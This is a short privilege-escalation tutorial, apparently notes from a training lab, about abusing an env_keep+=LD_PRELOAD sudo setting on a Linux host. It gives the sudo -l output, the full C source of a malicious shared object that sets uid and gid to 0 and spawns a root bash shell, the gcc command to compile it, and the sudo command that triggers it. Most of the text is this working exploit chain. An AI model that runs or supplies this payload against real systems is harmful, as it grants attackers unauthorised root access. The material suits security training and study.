# LD_PRELOAD Privilege Escalation
Let's see an example of how we can utilize the [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with sudo privileges.

```bash
sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```
We can see in last line `env_keep+=LD_PREALOAD` we can abuse it to get root using following maliciuos program:
```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
To compile:
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
Finally, to escalate we have to use full path of binary which is allowed to run as root without a password we saw it by 
`sudo -l` command:
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
